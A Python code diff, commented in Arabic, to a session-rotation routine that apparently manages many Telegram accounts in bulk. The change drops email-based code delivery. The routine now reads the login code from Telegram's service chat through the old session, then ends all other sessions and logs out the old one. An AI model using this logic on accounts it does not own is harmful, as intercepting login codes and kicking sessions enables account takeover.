@@ -1376,28 +1376,16 @@ async def _rotate_via_telegram_chat(phone: str, row) -> dict:
 async def rotate_session(phone: str) -> dict:
     """
     تغيير الجلسة بالكامل:
-    - إذا كان للحساب بريد Mail.tm مربوط: يُستخدم لاستلام الكود (أكثر موثوقية)
-    - وإلا: يُقرأ الكود من شات التيليجرام (777000) عبر الجلسة القديمة
-    في كلتا الحالتين: طرد الجلسات الأخرى + تسجيل خروج الجلسة القديمة.
+    يقرأ الكود من شات التيليجرام (777000) عبر الجلسة القديمة —
+    سياسة تيليجرام: الكود الذي يطلبه السكربت يصل للشات دائماً.
+    بعد الجلسة الجديدة: طرد الجلسات الأخرى + تسجيل خروج الجلسة القديمة.
     """
     row = await database.get_session_by_phone(phone)
     if not row:
         return {"success": False, "error": "الجلسة غير موجودة"}
 
-    login_email = database.row_login_email(row)
-    email_password = database.row_get(row, "email_password")
-    has_email = bool(
-        login_email
-        and email_password
-        and not database.is_legacy_login_email(login_email)
-    )
-
-    if has_email:
-        logger.info("rotate_session %s: using Mail.tm email delivery", phone)
-        return await _rotate_via_email(phone, row, login_email, email_password)
-    else:
-        logger.info("rotate_session %s: using Telegram chat fallback", phone)
-        return await _rotate_via_telegram_chat(phone, row)
+    logger.info("rotate_session %s: reading code from Telegram chat", phone)
+    return await _rotate_via_telegram_chat(phone, row)
 
 
 async def bulk_rotate_sessions(
